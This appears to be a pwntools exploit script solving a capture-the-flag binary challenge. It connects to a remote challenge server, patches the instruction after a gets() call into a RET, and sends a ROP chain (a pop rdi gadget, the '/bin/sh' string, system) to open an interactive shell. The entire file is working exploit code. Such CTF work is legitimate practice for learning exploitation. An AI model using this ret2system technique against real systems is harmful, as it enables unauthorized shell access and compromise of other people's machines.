#!/usr/bin/env python3

from pwn import *

#Arch:       amd64-64-little
#RELRO:      Partial RELRO
#Stack:      Canary found
#NX:         NX enabled
#PIE:        No PIE (0x400000)


exe = ELF("./patched")

context.binary = exe
context.log_level="debug"
GDBSCPT = '''
b *main
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        #gdb.attach(r, gdbscript=GDBSCPT)

    else:
        r = remote("pwn-patchmeup.pwnsec.xyz", 37117)

    return r


def main():
    r = conn()

    #0x00000000004017ec <+39>:    call   0x412600 <gets>
    #0x00000000004017f1 <+44>:    nop
   
    # return just after the gets function call
    r.sendline(b"17f1") # offset of NOP instruction
    r.sendline(b"c3")   # replace with RET opcode

    # build a rop chain
    rop = ROP(exe)
    rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])  
    rop.raw(next(exe.search(b'/bin/sh')))  
    rop.call(exe.symbols['system'])  


    payload = flat(rop.chain())

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
